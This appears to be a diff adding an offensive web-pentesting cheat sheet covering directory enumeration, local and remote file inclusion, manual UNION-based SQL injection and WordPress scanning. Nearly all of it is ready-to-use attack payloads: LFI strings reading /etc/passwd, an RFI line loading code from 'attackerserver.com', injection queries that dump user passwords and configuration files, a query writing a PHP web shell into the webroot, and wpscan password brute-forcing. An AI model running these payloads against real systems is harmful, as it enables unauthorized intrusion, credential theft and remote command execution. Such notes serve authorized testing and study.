@@ -1,0 +1,73 @@
+HTTP Enumeration
+----------------------------------------------
+# Gobuster
+gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+----------------------------------------------
+# nikto
+nıkto -h <targetip>
+----------------------------------------------
+# curl
+curl -v -X OPTIONS http://<targetip>/test/
+curl --upload-file <file name> -v --url <url> -0 --http1.0
+----------------------------------------------
+# LFI
+# PHP Wrapper
+php://filter/convert.base64-encode/resource=index.php
+# Null Byte
+?page=../../../../../../etc/passwd%00
+----------------------------------------------
+
+# RFI
+?page=http://attackerserver.com/evil.txt
+
+----------------------------------------------
+# Command Execution
+
+
+----------------------------------------------
+# SQL Injection (manual)
+photoalbum.php?id=1'
+
+# find the number of columns
+photoalbum.php?id=1 order by 8
+
+# Find space to output db
+?id=1 union select 1,2,3,4,5,6,7,8
+
+# Get username of the sql-user
+?id=1 union select 1,2,3,4,user(),6,7,8
+
+# Get version
+?id=1 union select 1,2,3,4,version(),6,7,8
+
+# Get all tables
+?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables
+
+# Get all columns from a specific table
+?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’
+?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’
+.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users
+
+# view files
+' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
+' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
+' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -
+' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -	
+
+# upload files
+' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -	&pass=.......
+' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -	&pass=.......
+' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -	&pass=.......
+' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -	&pass=.......
+
+----------------------------------------------
+
+# wordpress
+wpscan --url http://.... --log
+wpscan --url http://... --enumerate u --log
+wpscan --url http://<targetip> --wordlist wordlist.txt --username example_username
+http://....../wp-admin
+http://...../wp-content/uploads/2017/10/file.png
+
+
+
